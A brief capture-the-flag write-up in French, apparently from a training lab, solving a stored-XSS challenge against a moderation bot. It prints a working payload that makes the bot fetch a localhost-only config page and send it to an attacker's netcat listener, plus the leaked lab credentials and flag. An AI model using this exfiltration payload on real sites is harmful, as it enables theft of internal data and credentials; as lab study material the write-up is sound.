# XSS injection

flag: `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`

---

note: peut etre fait en passant par `/agenda` avec une injection de script dans le XML (les
commentaires html indiquent que `defusedxml` est desactive).

Le bot de moderation est vulnerable aux attaques XSS comme vu dans la faille 3
On va utiliser ca pour recuperer le contenu de /internal/config, qui n'est accessible que depuis le localhost:

```html
<!-- NOTE: /internal/config restricted to localhost only. do not expose. -->
```

meme technique que la faille precedante, on change jsute la payload

```shell
nc -l 0.0.0.0 "$nc_port"

payload="<img src=z onerror='fetch(&quot;/internal/config&quot;).then(r => r.text()).then(t => { fetch(&quot;http://$host:$nc_port/?cfg=&quot;+encodeURIComponent(t)) })'"

curl -s "http://$target/forum/$thread_id/comment' \
  -b cookies_jdoe.txt \
  --data-urlencode "content=$payload"
```
output:

```json
{
  "jwt_secret": "42network",
  "pb_admin_email": "admin@42network.local",
  "pb_admin_password": "Darkly42Admin!",
  "app_version": "1.0.0",
  "campus": "wilcity",
  "darkly_flag": "FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}"
}
```

On obtient un flag et les acces a pocketbase
